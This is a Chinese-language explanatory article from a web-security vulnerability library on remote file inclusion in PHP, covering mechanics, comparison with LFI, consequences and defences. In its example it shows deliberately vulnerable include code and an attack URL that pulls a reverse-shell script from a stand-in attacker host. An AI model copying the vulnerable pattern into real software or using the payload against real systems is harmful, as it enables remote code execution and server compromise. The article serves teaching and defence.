---
title: 远程文件包含
date: 2026-05-07
summary: 远程文件包含 (RFI) 是一种 Web 漏洞，可让恶意黑客强制应用程序包含从其他位置（例如，攻击者控制的服务器）导入的任意代码文件。
tags: 漏洞库, Web安全, 文件包含
cover: app-teal
readingTime: 6 分钟
featured: false
---
# 远程文件包含

### 什么是远程文件包含
远程文件包含 (RFI) 是一种 Web 漏洞，可让恶意黑客强制应用程序包含从其他位置（例如，攻击者控制的服务器）导入的任意代码文件。

<br>

### 远程文件包含如何工作
许多编程语言，包括那些在服务器端用于开发 Web 应用程序的语言，都允许开发人员包含来自其他文件的源代码。 一些用于包含源代码的函数只允许您包含本地文件，但在某些语言中，它们还允许通过 URL 包含。 例如，对于在复杂的多服务器应用程序中包含位于其他服务器上的源代码文件很有用。

这种包含通常是静态的，即文件的 URL 在源代码中定义并且不能修改。 但是，在某些应用程序中，开发人员可能希望从远程位置动态包含文件。 如果是这样，远程文件的 URL 可能会在用户输入参数中传递。

当恶意行为者可以修改用户输入以包含他们自己的远程文件时，就会发生远程文件包含漏洞。 此漏洞最常发生在使用包含表达式的旧版本 PHP 编写的应用程序和 API 中。 对于其他常见的 Web 应用程序编程语言，以类似方式包含文件需要复杂得多的编程结构。

请注意，自 2019 年 11 月发布的 PHP 7.4.0 以来，包含远程文件的功能已被弃用。

<br>

### 远程文件包含 与 本地文件包含
如果攻击者只能包含来自同一服务器的恶意文件，那就是本地文件包含 (LFI) 漏洞。 由于以下几个原因，LFI 漏洞更为常见：

- LFI 不仅包括开发人员包含源代码文件的情况，还包括攻击者可以访问他们不应访问的本地文件的所有情况。
- LFI 发生在大多数网络编程语言中，而不仅仅是 PHP，因为其他语言也允许开发人员打开和/或包含本地文件。
- 开发人员经常需要包含本地源代码或读取和显示本地文件的内容，这可能会导致 LFI。 他们很少需要包括来自远程位置的源代码，而这对于 RFI 是必需的。

本地文件包含通常也与目录遍历一起使用。 另一方面，根据定义，RFI 不能导致目录遍历，因为文件是由 URL 包含的，而不是路径/文件名。

您还可以将 RFI 视为一种类似于跨站点脚本的攻击。 在这两种情况下，易受攻击的应用程序都会从外部来源获取不受信任的代码并执行它。 但是，在 RFI 的情况下，攻击者滥用 PHP 包含机制而不是 \<scrip\> 标记。

<br>

### 远程文件包含攻击示例

以下是具有远程文件包含漏洞的 PHP 代码示例，以及对包含此代码的应用程序的攻击向量。

PHP 应用程序的开发人员想要包含来自另一台服务器的源代码文件，但包含的文件不是静态的。 以下是 index.php 文件中的代码片段。

<font color="#e90"><\?PHP </font>
  <font color="#a67f59">\$module</font> = <font color="#a67f59">\$_GET</font>[<font color="#00dd00">"module"</font>];
  <font color="#00dddd">include</font> <font color="#a67f59">\$module</font>;
<font color="#e90">?></font>

服务器的PHP版本：7.3.33。 php.ini 文件包含以下配置参数：

    allow_url_include = On

此参数（在 PHP 7.4.0 中已弃用）意味着 include 表达式可以解析 URL 并包含来自该 URL 的文件。

URL 直接取自 GET HTTP 请求，因此您可以包含模块 `http://server2.example.com/welcome.php`，如下所示：

    http://example.com/index.php?module=http://server2.example.com/welcome.php

#### 攻击向量
攻击者操纵发送到 index.php 的 GET 请求，以包含一个 URL，其中包含配置为连接到攻击者控制的服务器的 [pentest monkey 反向 shell 脚本](https://github.com/pentestmonkey/php-reverse-shell)：

    http://example.com/index.php?module=http://attacker.example2.com/php-reverse-shell.php

结果，应用程序运行反向 shell 的代码（远程代码执行），允许攻击者远程访问服务器命令行。

### 远程文件包含攻击的潜在后果
从上面的示例中可以看出，远程文件包含漏洞可能导致远程代码执行，因此攻击者可以获得对服务器的完全控制。 但是，包含的代码与Web服务器用户具有相同的执行权限，因此其访问权限受到限制。

在 RFI 攻击中，攻击者可以使用任何恶意代码，因此根据他们的意图，他们可以尝试将 RFI 升级为以下任何网络攻击场景：

- 勒索软件或其他恶意软件：攻击者可能会升级攻击以将勒索软件代理下载到机器上。 然后，这将使用其他方法传播到受害者拥有的其他资产。
- 加密货币挖掘：攻击者经常在受感染的机器上安装加密货币挖掘器。 挖矿会消耗您的计算资源，为网络犯罪分子提供进行更多恶意活动的资金。
- 窃取敏感数据：攻击者可能会升级攻击并窃取凭据以访问包含信用卡号等敏感信息的 SQL 数据库服务器。
- 后门：攻击者可能会在受害者系统上安装一个长期后门，并使用它来监视受害者的业务活动。

### 如何防止Web应用中的远程文件包含漏洞
有几种方法可以让您防止代码中的远程文件包含漏洞：

1. 完全避免在包含表达式中使用用户输入。 这意味着不仅 URL 来自直接用户输入（例如 GET/POST HTTP 参数），还意味着攻击者可以操纵的其他数据源，例如 cookie 和标头。
2. 如果您的应用程序要求您使用动态包含并且没有办法绕过它，请创建一个安全文件白名单。

注意：不要依赖黑名单、编码或输入验证/清理方法（例如过滤）来防止远程文件包含。 例如，不要试图限制或强制执行文件扩展名或阻止特殊字符序列。 攻击者有很多方法可以绕过此类过滤器。

### 如何缓解远程文件包含攻击
有两种非常有效的方法可以减轻 PHP 中的远程文件包含攻击：

请将您的 Web 服务器 PHP 升级到版本 7.4.0 或更高版本，或者请将您的 Web 服务器将指令 allow_url_include = Off 添加到 php.ini 文件。
这将使远程文件包含变得不可能，无论在 Web 服务器上运行的应用程序是由您的开发人员编写的自定义应用程序还是第三方/开源应用程序。 但是，这可能会导致某些历史应用程序无法运行。

